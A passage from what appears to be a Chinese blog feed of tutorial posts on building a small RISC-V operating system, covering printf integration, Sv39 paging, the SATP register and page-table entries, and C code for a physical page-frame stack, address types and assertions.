class="type">uint64_t</span> <span class="title function_">sys_gettime</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<p><strong>所以此时OS文件夹的结构如下所示</strong></p>
<p><img src="/2024/06/19/riscv-12-printf%E5%AE%9E%E7%8E%B0/image-20240620151205229.png" alt="文件架构"></p>
<h1 id="2-测试"><a href="#2-测试" class="headerlink" title="2.测试"></a>2.测试</h1><blockquote>
<p>makefile</p>
</blockquote>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">SRCS_C = \</span><br><span class="line">	sbi.c \</span><br><span class="line">	main.c \</span><br><span class="line">	printk.c \</span><br><span class="line">	trap.c \</span><br><span class="line">	syscall.c \</span><br><span class="line">	string.c \</span><br><span class="line">	app.c \</span><br><span class="line">	task.c \</span><br><span class="line">	timer.c \</span><br><span class="line">	vsprintf.c \</span><br><span class="line">	printf.c \</span><br><span class="line">	</span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;src&#x2F;app.c</p>
<p>将<code>sys_write</code>，全部修改为<code>printf</code></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(message);</span><br></pre></td></tr></table></figure>



<blockquote>
<p>执行</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo ./build.sh</span><br><span class="line">sudo ./run.sh</span><br></pre></td></tr></table></figure>

<p><img src="/2024/06/19/riscv-12-printf%E5%AE%9E%E7%8E%B0/image-20240620151120575.png" alt="image-20240620151120575"></p>
]]></content>
      <categories>
        <category>riscv</category>
      </categories>
      <tags>
        <tag>操作系统</tag>
        <tag>riscv，qemu</tag>
      </tags>
  </entry>
  <entry>
    <title>riscv-13-物理内存管理与分页机制介绍14</title>
    <url>/2024/06/20/riscv-13-%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E4%B8%8E%E5%88%86%E9%A1%B5%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h1 id="导读"><a href="#导读" class="headerlink" title="导读"></a>导读</h1><blockquote>
<p>参考：</p>
<ul>
<li><a href="https://rcore-os.gitcode.host/rCore-Tutorial-Book-v3/chapter4/1rust-dynamic-allocation.html">Rust 中的动态内存分配 — rCore-Tutorial-Book-v3 0.1 文档 (gitcode.host)</a></li>
</ul>
</blockquote>
<p>在应用程序的视角中，动态内存分配中的内存，其实就是操作系统管理的“堆 （Heap）”。但现在要实现操作系统，那么就需要操作系统自身能提供动态内存分配的能力。如果要实现动态内存分配的能力，需要操作系统需要有如下功能：</p>
<ul>
<li><strong>初始时能提供一块大内存空间作为初始的“堆”  。</strong>在没有分页机制情况下，这块空间是物理内存空间，否则就是虚拟内存空间。</li>
<li><strong>提供在堆上分配一块内存的函数接口。</strong>这样函数调用方就能够得到一块地址连续的空闲内存块进行读写。</li>
<li><strong>提供释放内存的函数接口</strong>。能够回收内存，以备后续的内存分配请求。</li>
<li><strong>提供空闲空间管理的连续内存分配算法</strong>。能够有效地管理空闲快，这样就能够动态地维护一系列空闲和已分配的内存块。</li>
<li><strong>（可选）提供建立在堆上的数据结构和操作</strong>。有了上述基本的内存分配与释放函数接口，就可以实现类似动态数组，动态字典等空间灵活可变的堆数据结构，提高编程的灵活性。</li>
</ul>
<p>操作系统给应用程序提供统一的访问接口，<strong>即应用程序不需要了解虚拟内存和物理内存的区别的，</strong>操作系统提出了 <code>地址空间 Address Space</code> 抽象，并<strong>在内核中建立虚实地址空间的映射机制，给应用程序提供一个虚拟的内存环境。</strong></p>
<p>到目前为止仍被操作系统内核广泛使用的抽象被称为 <strong>地址空间</strong> (Address Space) 。某种程度上讲，可以将它看成一块 巨大但并不一定真实存在的内存。在每个应用程序的视角里，操作系统分配给应用程序一个范围有限（但其实很大），独占的连续地址空间（其中有些地方被操作系统限制不能访问，如内核本身占用的虚地址空间等），因此应用程序可以在划分给它的地址空间中随意规划内存布局，它的 各个段也就可以分别放置在地址空间中它希望的位置（当然是操作系统允许应用访问的地址）。应用同样可以使用一个地址作为索引来读写自己地址空间的数据，就像用物理地址 作为索引来读写物理内存上的数据一样。这种地址被称为 <strong>虚拟地址</strong> (Virtual Address) 。当然，操作系统要达到 <strong>地址空间</strong> 抽象的设计目标，需要有计算机硬件的支持，这就是计算机组成原理课上讲到的 <code>MMU</code> 和 <code>TLB</code> 等硬件机制。</p>
<ul>
<li>分段分页式管理：<a href="https://rcore-os.gitcode.host/rCore-Tutorial-Book-v3/chapter4/2address-space.html">地址空间 — rCore-Tutorial-Book-v3 0.1 文档 (gitcode.host)</a></li>
</ul>
<p><strong>分段管理：</strong>尽管内碎片被消除了，但内存浪费问题并没有完全解决。这是因为每个段的大小都是不同的（它们可能来自不同的应用，功能 也不同），内核就需要使用更加通用、也更加复杂的连续内存分配算法来进行内存管理，而不能像之前的插槽那样以一个比特 为单位。顾名思义，连续内存分配算法就是每次需要分配一块连续内存来存放一个段的数据。 随着一段时间的分配和回收，物理内存还剩下一些相互不连续的较小的可用连续块，其中有一些只是两个已分配内存块之间的很小的间隙，它们自己可能由于空间较小，已经无法被 用于分配，被称为 <strong>外碎片</strong> (External Fragment) 。</p>
<img src="/2024/06/20/riscv-13-%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E4%B8%8E%E5%88%86%E9%A1%B5%E6%9C%BA%E5%88%B6/image-20240621164912284.png" alt="image-20240621164912284" style="zoom:80%;">



<p><strong>分页管理：</strong></p>
<p>就需要<strong>内核始终以一个同样大小的单位来在物理内存上放置应用地址空间中的数据，这样内核就可以 使用简单的插槽式内存管理，使得内存分配算法比较简单且不会产生外碎片；同时，这个单位的大小要足够小，从而其内部没有 被用到的内碎片的大小也足够小，尽可能提高内存利用率。这便是我们将要介绍的分页内存管理。</strong></p>
<p><img src="/2024/06/20/riscv-13-%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E4%B8%8E%E5%88%86%E9%A1%B5%E6%9C%BA%E5%88%B6/image-20240621165010141.png" alt="image-20240621165010141"></p>
<p>为了方便实现虚拟页面到物理页帧的地址转换，我们给每个虚拟页面和物理页帧一个编号，分别称为 <strong>虚拟页号</strong> (VPN, Virtual Page Number) 和 <strong>物理页号</strong> (PPN, Physical Page Number) 。每个应用都有一个不同的 <strong>页表</strong> (Page Table) ，里面记录了该应用地址空间中的每个虚拟页面映射到物理内存中的哪个物理页帧，即数据实际 被内核放在哪里。我们可以用页号来代表二者，因此如果将页表看成一个键值对，其键的类型为虚拟页号，值的类型则为物理 页号。</p>
<p><strong>当 MMU 进行地址转换的时候:</strong> 当然对三级页表 映射关系更加复杂，但总体上逻辑差不多</p>
<ol>
<li>它首先找到给定的虚拟地址所在的虚拟页面的页号</li>
<li>然后查当前应用的页表根据虚拟页号 找到物理页号</li>
<li>最后按照虚拟地址在它所在的虚拟页面中的相对位置相应给物理页号对应的物理页帧的起始地址加上一个偏移量， 这就得到了实际访问的物理地址。</li>
</ol>
<h1 id="1-riscv的分页机制"><a href="#1-riscv的分页机制" class="headerlink" title="1.riscv的分页机制"></a>1.riscv的分页机制</h1><p>riscv支持三种分页转换机制：</p>
<ul>
<li><strong>Sv32</strong>：仅支持32位riscv处理器，是一个二级页表结构，支持32位虚拟地址转换</li>
<li><strong>Sv39</strong>：支持64位riscv处理器，是一个三级页表结构，支持39位虚拟地址转换</li>
<li><strong>Sv48</strong>：支持64位riscv处理器，是一个四级页表结构，支持48位虚拟地址转换</li>
</ul>
<p>我们采用<code>sv39</code>的机制进行分页管理，即使用三级页表结构</p>
<blockquote>
<p>参考：</p>
<ol>
<li><a href="https://blog.csdn.net/qq_40379102/article/details/132108803">RISC-V 虚拟存储系统（文档阅读学习）_satp寄存器-CSDN博客</a></li>
<li><a href="https://rcore-os.gitcode.host/rCore-Tutorial-Book-v3/chapter4/3sv39-implementation-1.html">实现 SV39 多级页表机制（上） — rCore-Tutorial-Book-v3 0.1 文档 (gitcode.host)</a></li>
</ol>
</blockquote>
<p>介绍如下：</p>
<h2 id="SATP寄存器"><a href="#SATP寄存器" class="headerlink" title="SATP寄存器"></a><strong>SATP寄存器</strong></h2><p>SATP（Supervisor Address Translation and Protection Register）：控制<code>supervisor</code>模式下的地址转换和保护</p>
<p><img src="/2024/06/20/riscv-13-%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E4%B8%8E%E5%88%86%E9%A1%B5%E6%9C%BA%E5%88%B6/image-20240620164636731.png" alt="image-20240620164636731"></p>
<ul>
<li><code>MODE</code> 控制 CPU 使用哪种页表实现；当 <code>MODE</code> 设置为 0 的时候，代表所有访存都被视为物理地址；而<strong>设置为 8 的时候，SV39 分页机制被启用</strong>，所有 S&#x2F;U 特权级的访存被视为一个 <strong>39 位的虚拟地址</strong>，它们需要先经过 <code>MMU(memory menage unit内存管理单元)</code> 的地址转换流程，如果顺利的话，<strong>则会变成一个 56 位的物理地址来访问物理内存；否则则会触发异常。</strong></li>
<li><code>ASID</code> 表示地址空间标识符，这里还没有涉及到进程的概念，我们不需要管这个地方；其实就是表示当前进程的<code>ASID</code>号</li>
<li><code>PPN</code> 存的是根页表所在的物理页号。这样，给定一个虚拟页号，CPU 就可以从三级页表的根页表开始一步步的将其映射到一个物理页号。</li>
</ul>
<h2 id="Sv39"><a href="#Sv39" class="headerlink" title="Sv39"></a>Sv39</h2><ul>
<li>39位虚拟地址空间</li>
<li>支持大小4KB，2MB，1GB的页；</li>
<li>三级页表结构，每个页有<code>512</code>个表项，每个表项8B，故每个页表项地址8B对齐；</li>
<li>每一级的PTE都可能是叶子<code>PTE(page table entry)页表条目</code>，即包含最终物理地址的PTE。</li>
<li>物理地址构成：<ul>
<li><strong>- 4KB：</strong>{PPN[2] , PPN[1] , PPN[0] , VA.pageoffset}</li>
<li><strong>- 2MB：</strong>{PPN[2] , PPN[1] , VPN[0] , VA.pageoffset}</li>
<li><strong>- 1GB：</strong>{PPN[2] , VPN[1] , VPN[0] , VA.pageoffset}</li>
</ul>
</li>
</ul>
<p><img src="/2024/06/20/riscv-13-%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E4%B8%8E%E5%88%86%E9%A1%B5%E6%9C%BA%E5%88%B6/image-20240620170056663.png" alt="image-20240620170056663"></p>
<blockquote>
<ul>
<li>取指、load、store的地址是64位，<strong>地址的63:39位必须与第38位相同</strong>，否则会导致page fault异常；</li>
</ul>
</blockquote>
<h3 id="PTE"><a href="#PTE" class="headerlink" title="PTE"></a>PTE</h3><p>在<code>PTE</code>的结构中定义了如何将虚拟地址映射到物理地址：</p>
<ul>
<li>**V (Valid)**：有效位，表示该页表条目是否有效。</li>
<li>**R (Read)**：读位，表示该页是否可读。</li>
<li>**W (Write)**：写位，表示该页是否可写。</li>
<li>**X (Execute)**：执行位，表示该页是否可执行。</li>
<li>**U (User)**：用户位，表示该页是否在用户模式下可访问。</li>
<li>**G (Global)**：全局位，表示该页是否对所有地址空间可见。</li>
<li>**A (Accessed)**：访问位，表示该页是否被访问过。</li>
<li>**D (Dirty)**：脏位，表示该页是否被写入过。</li>
<li>**RSW (Reserved for Software)**：保留给软件使用的位。</li>
<li>**PPN (Physical Page Number)**：物理页号，表示该页的物理地址。</li>
<li><strong>Reserved</strong>：保留位</li>
</ul>
<h3 id="三级页表虚拟地址转换物理地址过程"><a href="#三级页表虚拟地址转换物理地址过程" class="headerlink" title="三级页表虚拟地址转换物理地址过程"></a>三级页表虚拟地址转换物理地址过程</h3><blockquote>
<ul>
<li><strong>地址的63:39位必须与第38位相同</strong></li>
<li>以下图片来自：<a href="https://blog.csdn.net/qq_32276547/article/details/127824142">RISC-V Linux启动之页表创建分析_riscv的sv39中为什么要先设置临时页表-CSDN博客</a></li>
</ul>
</blockquote>
<img src="/2024/06/20/riscv-13-%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E4%B8%8E%E5%88%86%E9%A1%B5%E6%9C%BA%E5%88%B6/image-20240620172006572.png" alt="image-20240620172006572" style="zoom:80%;">

<ul>
<li><code>MMU</code>通过<code>satp</code>寄存器得到<code>PGD</code>的物理地址，结合<code>PGD index</code>（即<code>VPN[2]</code>）找到<code>PMD</code>；找到<code>PMD</code>后，再结合<code>PMD index</code>（即<code>VPN[1]</code>）找到<code>PTE</code>，然后结合<code>PTE index</code>（即<code>VPN[0]</code>）得到<code>VA</code>在<code>PTE</code>索引中的值，从而得到物理地址。</li>
</ul>
<h1 id="2-使用栈管理物理页帧"><a href="#2-使用栈管理物理页帧" class="headerlink" title="2.使用栈管理物理页帧"></a>2.使用栈管理物理页帧</h1><h2 id="栈数据结构以及相关函数的实现"><a href="#栈数据结构以及相关函数的实现" class="headerlink" title="栈数据结构以及相关函数的实现"></a>栈数据结构以及相关函数的实现</h2><p>c语言下需要自己实现栈的数据结构，分别新建stack.c和.h文件</p>
<blockquote>
<p>OS&#x2F;lib&#x2F;stack.h</p>
<ul>
<li>stack结构体中 <code>data</code>维护的是物理页号，所以物理页号是u64类型的</li>
<li>然后声明了相关的函数</li>
<li>栈顶需要定义成int类型，不能定义成无符号类型，因为对栈初始化时，top的值被设置为-1，但是后面会让top和0进行大小比较，如果设置成无符号会导致结果出错。</li>
</ul>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SOS_STACK_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOS_STACK_H__</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sifanos/os.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_SIZE 10000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    u64 data[MAX_SIZE];</span><br><span class="line">    <span class="type">int</span> top;    <span class="comment">// 不能定义成无符号类型，不然会导致 -1 &gt; 0</span></span><br><span class="line">&#125; Stack;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isEmpty</span><span class="params">(Stack *<span class="built_in">stack</span>)</span>;</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isFull</span><span class="params">(Stack *<span class="built_in">stack</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(Stack *<span class="built_in">stack</span>, u64 value)</span>;</span><br><span class="line">u64 <span class="title function_">pop</span><span class="params">(Stack *<span class="built_in">stack</span>)</span>;</span><br><span class="line">u64 <span class="title function_">top</span><span class="params">(Stack *<span class="built_in">stack</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;lib&#x2F;stack.c</p>
<p>实现了相关的函数 </p>
<p>注意 bool 类型还需要在types.h中进行定义</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sifanos/stack.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化栈</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">initStack</span><span class="params">(Stack *<span class="built_in">stack</span>)</span> &#123;</span><br><span class="line">    <span class="built_in">stack</span>-&gt;top = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断栈是否为空</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isEmpty</span><span class="params">(Stack *<span class="built_in">stack</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">stack</span>-&gt;top == <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 判断栈是否已满</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isFull</span><span class="params">(Stack *<span class="built_in">stack</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">stack</span>-&gt;top == MAX_SIZE - <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 入栈操作</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">push</span><span class="params">(Stack *<span class="built_in">stack</span>, u64 value)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (isFull(<span class="built_in">stack</span>)) &#123;</span><br><span class="line">        printk(<span class="string">&quot;Stack overflow\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">stack</span>-&gt;data[++<span class="built_in">stack</span>-&gt;top] = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 出栈操作</span></span><br><span class="line">u64 <span class="title function_">pop</span><span class="params">(Stack *<span class="built_in">stack</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (isEmpty(<span class="built_in">stack</span>)) &#123;</span><br><span class="line">        printk(<span class="string">&quot;Stack underflow\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>; <span class="comment">// 表示栈为空或操作失败</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">stack</span>-&gt;data[<span class="built_in">stack</span>-&gt;top--];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取栈顶元素</span></span><br><span class="line">u64 <span class="title function_">top</span><span class="params">(Stack *<span class="built_in">stack</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (isEmpty(<span class="built_in">stack</span>)) &#123;</span><br><span class="line">        printk(<span class="string">&quot;Stack is empty\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>; <span class="comment">// 表示栈为空</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">stack</span>-&gt;data[<span class="built_in">stack</span>-&gt;top];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>OS&#x2F;include&#x2F;types.h</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> __cplusplus</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bool _Bool</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> true 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> false 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<h2 id="内存管理相关函数的实现"><a href="#内存管理相关函数的实现" class="headerlink" title="内存管理相关函数的实现"></a>内存管理相关函数的实现</h2><p>分别新建<code>address.c</code> 和 <code>address.h</code></p>
<blockquote>
<p>include&#x2F;address.h</p>
<p>定义了PA，VA，PPN，VPN 以及对相应的位进行操作  注意还需要实现 <code>string.h</code>文件和 <code>assert.h</code>文件  断言</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SOS_ADDRESS_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOS_ADDRESS_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sifanos/os.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sifanos/stack.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sifanos/string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sifanos/assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 0x1000      <span class="comment">// 4kb  一页的大小</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE_BITS   0xc  <span class="comment">// 12   页内偏移地址长度</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PA_WIDTH_SV39 56      <span class="comment">//物理地址长度 0 - 55</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VA_WIDTH_SV39 39      <span class="comment">//虚拟地址长度 Sv39</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PPN_WIDTH_SV39 (PA_WIDTH_SV39 - PAGE_SIZE_BITS)  <span class="comment">// 物理页号 44位 [55:12]</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VPN_WIDTH_SV39 (VA_WIDTH_SV39 - PAGE_SIZE_BITS)  <span class="comment">// 虚拟页号 27位 [38:12]</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MEMORY_END 0x80800000    <span class="comment">// 0x80200000 ~ 0x80800000</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MEMORY_START 0x80400000  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 物理地址 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> value; </span><br><span class="line">&#125; PhysAddr;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 虚拟地址 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> value;</span><br><span class="line">&#125; VirtAddr;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 物理页号 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> value;</span><br><span class="line">&#125; PhysPageNum;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 虚拟页号 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> value;</span><br><span class="line">&#125; VirtPageNum;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义位掩码常量</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_V (1 &lt;&lt; 0)   <span class="comment">//有效位</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_R (1 &lt;&lt; 1)   <span class="comment">//可读属性</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_W (1 &lt;&lt; 2)   <span class="comment">//可写属性</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_X (1 &lt;&lt; 3)   <span class="comment">//可执行属性</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_U (1 &lt;&lt; 4)   <span class="comment">//用户访问模式</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_G (1 &lt;&lt; 5)   <span class="comment">//全局映射</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_A (1 &lt;&lt; 6)   <span class="comment">//访问标志位</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PTE_D (1 &lt;&lt; 7)   <span class="comment">//脏位</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>string.h</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SOS_STRING_H__</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOS_STRING_H__</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sifanos/os.h&gt;</span></span></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">strlen</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *str)</span>;</span><br><span class="line"><span class="type">void</span>* <span class="title function_">memcpy</span><span class="params">(<span class="type">void</span> *dest, <span class="type">const</span> <span class="type">void</span> *src, <span class="type">size_t</span> count)</span>;</span><br><span class="line"><span class="type">void</span>* <span class="title function_">memset</span><span class="params">(<span class="type">void</span> *dest, <span class="type">int</span> ch, <span class="type">size_t</span> count)</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>assert.h</p>
<p>这里实现了断言，注意预定义的宏</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> SOS_ASSERT_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SOS_ASSERT_H</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">assertion_failure</span><span class="params">(<span class="type">char</span> *<span class="built_in">exp</span>, <span class="type">char</span> *file, <span class="type">char</span> *base, <span class="type">int</span> line)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">__FILE__是一个预定义的宏，在C语言中表示当前源文件的文件名。</span></span><br><span class="line"><span class="comment">在预处理阶段，编译器会将所有的__FILE__宏替换为当前源文件的文件名字符串。</span></span><br><span class="line"><span class="comment">__BASE_FILE__是一个预定义的宏，在某些编译器中用于表示当前编译单元的顶层源文件的文件名，</span></span><br><span class="line"><span class="comment">即当前源文件所属的工程或者库的主文件名。</span></span><br><span class="line"><span class="comment">__LINE__是一个预定义的宏，在C语言中表示当前代码所在的行号。</span></span><br><span class="line"><span class="comment">在预处理阶段，编译器会将所有的__LINE__宏替换为当前代码所在的行号。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> assert(exp) \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (exp)        \</span></span><br><span class="line"><span class="meta">        ;           \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span>            \</span></span><br><span class="line"><span class="meta">        assertion_failure(#exp, __FILE__, __BASE_FILE__, __LINE__)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure>



<blockquote>
<p>src&#x2F;assert.c</p>
<p>出现错误后会调用<code>printk</code>函数</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sifanos/assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sifanos/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 强制阻塞</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">spin</span><span class="params">(<span class="type">char</span> *name)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(<span class="string">&quot;spinning in %s ...\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">        ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//提示报错信息</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">assertion_failure</span><span class="params">(<span class="type">char</span> *<span class="built_in">exp</span>, <span class="type">char</span> *file, <span class="type">char</span> *base, <span class="type">int</span> line)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(</span><br><span class="line">        <span class="string">&quot;\n--&gt; assert(%s) failed!!!\n&quot;</span></span><br><span class="line">        <span class="string">&quot;--&gt; file: %s \n&quot;</span></span><br><span class="line">        <span class="string">&quot;--&gt; base: %s \n&quot;</span></span><br><span class="line">        <span class="string">&quot;--&gt; line: %d \n&quot;</span>,</span><br><span class="line">        <span class="built_in">exp</span>, file, base, line);</span><br><span class="line"></span><br><span class="line">    spin(<span class="string">&quot;assertion_failure()&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<blockquote>
<p>src&#x2F;address.c</p>
<p>首先将<code>uint_64</code>，转换为虚拟地址 物理地址 ppn vpn等</p>
<ul>
<li><p>**<code>phys_addr_from_size_t</code>**：将一个 <code>uint64_t</code> 类型的值转换为物理地址 <code>PhysAddr</code>。</p>
<ul>
<li>通过与掩码 <code>(1ULL &lt;&lt; PA_WIDTH_SV39) - 1</code> 相与，确保结果在物理地址的有效范围内。</li>
</ul>
</li>
<li><p>**<code>phys_page_num_from_size_t</code>**：将一个 <code>uint64_t</code> 类型的值转换为物理页号 <code>PhysPageNum</code>。</p>
<ul>
<li>同样通过与掩码 <code>(1ULL &lt;&lt; PPN_WIDTH_SV39) - 1</code> 相与，确保结果在物理页号的有效范围内。</li>
</ul>
<p>**<code>size_t_from_phys_addr</code>**：将物理地址 <code>PhysAddr</code> 转换为 <code>uint64_t</code>。</p>
<ul>
<li>直接返回物理地址的 <code>value</code> 字段。</li>
</ul>
<p>**<code>size_t_from_phys_page_num</code>**：将物理页号 <code>PhysPageNum</code> 转换为 <code>uint64_t</code>。</p>
<ul>
<li>直接返回物理页号的 <code>value</code> 字段。</li>
</ul>
<p>**<code>phys_addr_from_phys_page_num</code>**：将物理页号 <code>PhysPageNum</code> 转换为物理地址 <code>PhysAddr</code>。</p>
<ul>
<li>通过左移 <code>PAGE_SIZE_BITS</code> 位，将页号转换为地址。</li>
</ul>
<p>**<code>virt_addr_from_size_t</code>**：将一个 <code>uint64_t</code> 类型的值转换为虚拟地址 <code>VirtAddr</code>。</p>
<ul>
<li>通过与掩码 <code>(1ULL &lt;&lt; VA_WIDTH_SV39) - 1</code> 相与，确保结果在虚拟地址的有效范围内。</li>
</ul>
